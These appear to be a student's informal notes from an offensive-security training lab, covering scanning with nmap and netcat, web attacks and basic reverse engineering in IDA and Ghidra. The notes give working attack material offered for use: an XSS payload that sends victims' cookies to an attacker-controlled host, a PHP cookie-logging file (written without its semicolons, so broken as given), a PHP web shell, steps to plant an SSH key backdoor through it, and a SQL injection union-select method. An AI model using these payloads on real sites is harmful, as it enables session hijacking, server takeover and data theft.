Website Scraper 

#!/usr/bin/python3

## IMPORTS ##
import lxml.html
import requests

## Grabs Webpage ##
page = requests.get('http://quotes.toscrape.com') (this is the website to change)
tree = lxml.html.fromstring(page.content)

## Outlines Tags You Want to Grab ##
# Change//small[..] to whatever tag you want. Leave /text() #
authors = tree.xpath('//small[@class="author"]/text()')

## Print (duh) ##
print ('Authors: ',authors)

Dont use Python3, use python2

frontend = the website you can access normally - backend = the server the website is stored on
can use 0.0.0.0 to reference yourself and any tunnels you have setup to websites

Example scan 
nmap -Pn -T4 10.50.37.95 -p 22,80,8080,8888,2222,4444
(use nmap only for single targets)

after getting ports banner grab using netcat
nc 10.50.37.95 22

Ping sweep example
for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done 
(run this as close to the network you are trying to scan as possible, also dont scan the grey host network)

can use (previous nmap scan) --script banner.nse which automatically banner grabs ports that nmap finds
can use (previous nmap scan) --script http-enum.nse used for websites to enumerate well known paths
can use (previous nmap scan) --script smb-os-dicovery.nse (for windows machines)

nikto -host <ip address> (-port used if port is weird) can be used to get more website related information for an ip

========================================== COOKIE STEALING ===========================================
<script>document.location="<http://your opstation ip:8000/>"+document.cookie;</script>
run python3 -m http.server on your opstation before embedding the above code into the website to receive the cookie you just captured

cookie stealer file (CookieSteal.php)
<?php
$cookie = $_GET["username"]
$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+")
fwrite($steal, $cookie . "\n")
fclose($steal)
?>

(create a cookiefile.txt for the variable $steal)
upload these files and then use <script>document.location="http://<ServerIP>/uploads/cookiestealer.php?username="+document.cookie;</script> on the vulnerable website using XXS

webshell.php file
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
}
?>
</pre>
</BODY></HTML>

to use this file also upload it to the vulnerable website to gain a basic shell on the box through the website

use the webshell to get cmd injection which means you can run any command using ; <cmd to run>
to gain access to the box using webshell: use whoami to see who you are then get your home directory
after finding your directory do ssh-keygen -t rsa -b 4096 and pay attention to where the keys are gonna be saved with no passphrase(just hit enter twice)
take the .ssh/id_rsa.pub and copy just the key into the previously discovered home folder for your account on the webshell
on this home folder ; mkdir <absolute path to home directory>/.ssh then echo "your copied public key" > <your home directory>/.ssh/authorized_keys
from here you should be able to ssh straight into the target from your box using ssh -i <where your private key is(ssh_rsa)> www-data@<target box>

for sql use show databases; to see all the different databases
use show tables from session; to see tables for a given session
select * from session.Tires; to get everything in the given table
select tireid,name,cost from session.Tires; to get specific info for the columns
use session; specifies a databse to step into which allows you to just specify the table you need

SQL BY THE NUMBERS
Browse website as normal & find input fields + variables
Test each field GET and/or POST (' OR 1='1)
find total # of columns (UNION 1,2,3....(test a lot to make sure you get the exact number of columns))
GOLDEN STATEMENT, UNION SELECT table_schema, table_name, column_name, (plus placeholders if needed)(can change order to fit funky tables) from information_schema.columns (find useful fields to use in your custom table statement)
Make new query based on custom tables+columns UNION SELECT <Values you found important> from CustomTable.CustomColumn;# 

*Get version information using @@version*

REVERSE ENGINEERING DEMO

IDA
Make sure to double check using ida and ghidra (but run it first)
make note of what it does when it runs to look for in ida
in Ida use view to search for strings view-open_subviews-strings
click on the string window to allow you to use CTRL+f to find your string then double-click on it to see where in the assembly code it is stored
we want success with the malware so we find success and double-click on the sub-whatver to go to it and begin reverse engineering through the code
red and green arrows mean what happens based on a compare statement and the JZ or JNZ
press h on hexadecimal text to convert it to decimal
move up line by line looking for the variable you found but stopping to check call functions and read their subkey
GENERALLY in IDA with ebp+<any variable> it is user input that is needed 

GHIDRA
create a new project to check new programs and then import said file to check it'
click yes on analyze file then just immediately hit analyze without changing anything
once again look for any strings you can remember by going to search and then for strings and changing the filter box
double click on what you found and then minimize the window you are on to begin reverse engineering
click on the FUN associated with the string you found after searching to get psudeocode
you can right click on hex to change it to decimal
can also right click on variables to rename them
param_1 is usually user input



